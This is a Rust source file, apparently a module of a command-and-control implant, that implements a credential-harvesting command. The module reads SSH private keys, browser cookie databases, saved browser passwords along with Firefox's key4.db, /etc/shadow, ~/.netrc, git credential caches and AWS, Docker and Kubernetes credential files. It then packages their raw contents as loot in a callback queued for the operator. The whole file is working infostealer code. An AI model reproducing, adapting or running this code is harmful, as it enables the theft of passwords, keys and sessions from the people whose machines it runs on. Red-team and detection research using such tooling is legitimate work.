//! `CommandHarvest` (ID 2580): credential collection from common Linux locations.

use std::fs;
use std::path::Path;
use std::path::PathBuf;

use red_cell_common::demon::DemonCommand;

use crate::error::PhantomError;

use super::encode::encode_harvest_entries;
use super::types::PendingCallback;
use super::PhantomState;

/// Handle `CommandHarvest` (ID 2580): collect credentials from common Linux locations.
///
/// Collects the following material without executing subprocesses:
/// - SSH private keys from `~/.ssh/` (files that look like PEM or OpenSSH private keys)
/// - Browser cookie databases: Chrome/Chromium and Firefox profile directories
/// - `/etc/shadow` (only if readable — root context)
/// - Cloud/tool credential files: `~/.aws/credentials`, `~/.docker/config.json`,
///   `~/.kube/config`
///
/// Each collected item is returned as a separate loot entry in a single
/// [`PendingCallback::Structured`] response with the following wire format:
///
/// ```text
/// entry_count : u32 (LE)
/// for each entry:
///   kind  : u32-length-prefixed UTF-8 string
///   path  : u32-length-prefixed UTF-8 string
///   data  : u32-length-prefixed bytes
/// ```
pub(super) async fn execute_harvest(
    request_id: u32,
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let entries = tokio::task::spawn_blocking(collect_credentials)
        .await
        .map_err(|e| PhantomError::Screenshot(format!("harvest spawn_blocking error: {e}")))?;

    let payload = encode_harvest_entries(&entries)?;
    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandHarvest),
        request_id,
        payload,
    });
    Ok(())
}

/// A single harvested credential item.
#[derive(Debug, Clone)]
pub(crate) struct HarvestEntry {
    /// Short label: `ssh_key`, `cookie_db`, `shadow`, `credentials`.
    pub(crate) kind: String,
    /// Absolute path the file was read from.
    pub(crate) path: String,
    /// Raw file contents.
    pub(crate) data: Vec<u8>,
}

/// Synchronous credential collection — run inside `spawn_blocking`.
fn collect_credentials() -> Vec<HarvestEntry> {
    let mut entries = Vec::new();

    let home = match std::env::var("HOME") {
        Ok(h) => PathBuf::from(h),
        Err(_) => {
            // Fall back to /root or skip home-relative paths.
            PathBuf::from("/root")
        }
    };

    // 1. Plaintext credentials from ~/.netrc
    collect_netrc(&home, &mut entries);

    // 2. SSH private keys from ~/.ssh/
    collect_ssh_keys(&home, &mut entries);

    // 3. Browser cookie databases
    collect_browser_cookies(&home, &mut entries);

    // 4. Browser saved passwords (Chromium Login Data / Firefox logins.json)
    collect_browser_passwords(&home, &mut entries);

    // 5. /etc/shadow (root context)
    collect_shadow(&mut entries);

    // 6. Git credential helper cache
    collect_git_credential_cache(&mut entries);

    // 7. Cloud/tool credential files
    for (rel, kind) in &[
        (".aws/credentials", "credentials"),
        (".docker/config.json", "credentials"),
        (".kube/config", "credentials"),
    ] {
        let path = home.join(rel);
        if let Ok(data) = fs::read(&path) {
            if !data.is_empty() {
                entries.push(HarvestEntry {
                    kind: (*kind).to_owned(),
                    path: path.display().to_string(),
                    data,
                });
            }
        }
    }

    entries
}

/// Collect SSH private key files from `~/.ssh/`.
///
/// Reads all regular files whose content starts with a PEM `-----BEGIN` header
/// or the OpenSSH `openssh-key-v1` magic bytes — ignoring public keys, known_hosts, etc.
fn collect_ssh_keys(home: &Path, entries: &mut Vec<HarvestEntry>) {
    let ssh_dir = home.join(".ssh");
    let read_dir = match fs::read_dir(&ssh_dir) {
        Ok(rd) => rd,
        Err(_) => return,
    };
    for entry in read_dir.flatten() {
        let path = entry.path();
        let Ok(meta) = entry.metadata() else { continue };
        if !meta.is_file() {
            continue;
        }
        let Ok(data) = fs::read(&path) else { continue };
        if is_private_key_bytes(&data) {
            entries.push(HarvestEntry {
                kind: "ssh_key".to_owned(),
                path: path.display().to_string(),
                data,
            });
        }
    }
}

/// Returns `true` when the byte slice looks like an SSH/PEM private key.
pub(super) fn is_private_key_bytes(data: &[u8]) -> bool {
    // PEM-wrapped private key (RSA, EC, DSA, generic PKCS#8, or OpenSSH format)
    let pem_marker = b"-----BEGIN";
    if data.starts_with(pem_marker) {
        // Exclude public keys: "-----BEGIN PUBLIC KEY-----" / "-----BEGIN ... PUBLIC KEY-----"
        let header_end = data.iter().position(|&b| b == b'\n').unwrap_or(data.len());
        let header = &data[..header_end];
        if !header.windows(10).any(|w| w == b"PUBLIC KEY") {
            return true;
        }
    }
    // OpenSSH binary format magic
    if data.starts_with(b"openssh-key-v1\x00") {
        return true;
    }
    false
}

/// Collect browser cookie SQLite databases from Chrome/Chromium and Firefox profiles.
fn collect_browser_cookies(home: &Path, entries: &mut Vec<HarvestEntry>) {
    // Chrome / Chromium candidates
    let chrome_candidates = [
        ".config/google-chrome/Default/Cookies",
        ".config/chromium/Default/Cookies",
        ".config/google-chrome/Profile 1/Cookies",
        ".config/BraveSoftware/Brave-Browser/Default/Cookies",
    ];
    for rel in &chrome_candidates {
        let path = home.join(rel);
        if let Ok(data) = fs::read(&path) {
            if !data.is_empty() {
                entries.push(HarvestEntry {
                    kind: "cookie_db".to_owned(),
                    path: path.display().to_string(),
                    data,
                });
            }
        }
    }

    // Firefox: enumerate profiles from ~/.mozilla/firefox/
    let ff_dir = home.join(".mozilla/firefox");
    if let Ok(profiles) = fs::read_dir(&ff_dir) {
        for profile in profiles.flatten() {
            let cookies_path = profile.path().join("cookies.sqlite");
            if let Ok(data) = fs::read(&cookies_path) {
                if !data.is_empty() {
                    entries.push(HarvestEntry {
                        kind: "cookie_db".to_owned(),
                        path: cookies_path.display().to_string(),
                        data,
                    });
                }
            }
        }
    }
}

/// Attempt to read `/etc/shadow` (requires root or `shadow` group membership).
fn collect_shadow(entries: &mut Vec<HarvestEntry>) {
    if let Ok(data) = fs::read("/etc/shadow") {
        if !data.is_empty() {
            entries.push(HarvestEntry {
                kind: "shadow".to_owned(),
                path: "/etc/shadow".to_owned(),
                data,
            });
        }
    }
}

/// Collect plaintext credentials from `~/.netrc`.
///
/// The `.netrc` file stores machine/login/password triples in plaintext and is
/// used by curl, ftp, and other tools. We harvest the entire file contents.
pub(super) fn collect_netrc(home: &Path, entries: &mut Vec<HarvestEntry>) {
    let path = home.join(".netrc");
    if let Ok(data) = fs::read(&path) {
        if !data.is_empty() {
            entries.push(HarvestEntry {
                kind: "credentials".to_owned(),
                path: path.display().to_string(),
                data,
            });
        }
    }
}

/// Collect browser saved-password databases from Chromium-based and Firefox profiles.
///
/// Chromium stores passwords in a SQLite file named `Login Data`.
/// Firefox stores them in `logins.json` (encrypted with the profile's key4.db).
pub(super) fn collect_browser_passwords(home: &Path, entries: &mut Vec<HarvestEntry>) {
    // Chromium-based browsers: Login Data
    let chromium_candidates = [
        ".config/google-chrome/Default/Login Data",
        ".config/chromium/Default/Login Data",
        ".config/google-chrome/Profile 1/Login Data",
        ".config/BraveSoftware/Brave-Browser/Default/Login Data",
    ];
    for rel in &chromium_candidates {
        let path = home.join(rel);
        if let Ok(data) = fs::read(&path) {
            if !data.is_empty() {
                entries.push(HarvestEntry {
                    kind: "credentials".to_owned(),
                    path: path.display().to_string(),
                    data,
                });
            }
        }
    }

    // Firefox: logins.json + key4.db from each profile directory.
    // logins.json contains the encrypted login entries; key4.db holds the
    // NSS key material required to decrypt them.  Both are needed.
    let ff_dir = home.join(".mozilla/firefox");
    if let Ok(profiles) = fs::read_dir(&ff_dir) {
        for profile in profiles.flatten() {
            let profile_path = profile.path();
            let logins_path = profile_path.join("logins.json");
            let key4_path = profile_path.join("key4.db");
            if let Ok(data) = fs::read(&logins_path) {
                if !data.is_empty() {
                    entries.push(HarvestEntry {
                        kind: "credentials".to_owned(),
                        path: logins_path.display().to_string(),
                        data,
                    });
                }
            }
            if let Ok(data) = fs::read(&key4_path) {
                if !data.is_empty() {
                    entries.push(HarvestEntry {
                        kind: "credentials".to_owned(),
                        path: key4_path.display().to_string(),
                        data,
                    });
                }
            }
        }
    }
}

/// Collect git credential helper cache files.
///
/// The `git-credential-cache` daemon stores plaintext credentials at
/// `/run/user/<uid>/git-credential-cache/socket` (the socket itself) and
/// typically caches credentials in a file alongside it. We read any regular
/// files in the cache directory.
fn collect_git_credential_cache(entries: &mut Vec<HarvestEntry>) {
    let uid = unsafe { libc::getuid() };
    let cache_dir = PathBuf::from(format!("/run/user/{uid}/git-credential-cache"));
    collect_git_credential_cache_from(&cache_dir, entries);
}

/// Walk `dir` and collect every non-empty regular file as a `"credentials"` harvest entry.
///
/// Extracted from [`collect_git_credential_cache`] so the directory-walk logic can be
/// unit-tested against a temp directory without depending on `/run/user/<uid>`.
pub(super) fn collect_git_credential_cache_from(dir: &Path, entries: &mut Vec<HarvestEntry>) {
    let read_dir = match fs::read_dir(dir) {
        Ok(rd) => rd,
        Err(_) => return,
    };
    for entry in read_dir.flatten() {
        let path = entry.path();
        let Ok(meta) = entry.metadata() else { continue };
        if !meta.is_file() {
            continue;
        }
        let Ok(data) = fs::read(&path) else { continue };
        if !data.is_empty() {
            entries.push(HarvestEntry {
                kind: "credentials".to_owned(),
                path: path.display().to_string(),
                data,
            });
        }
    }
}
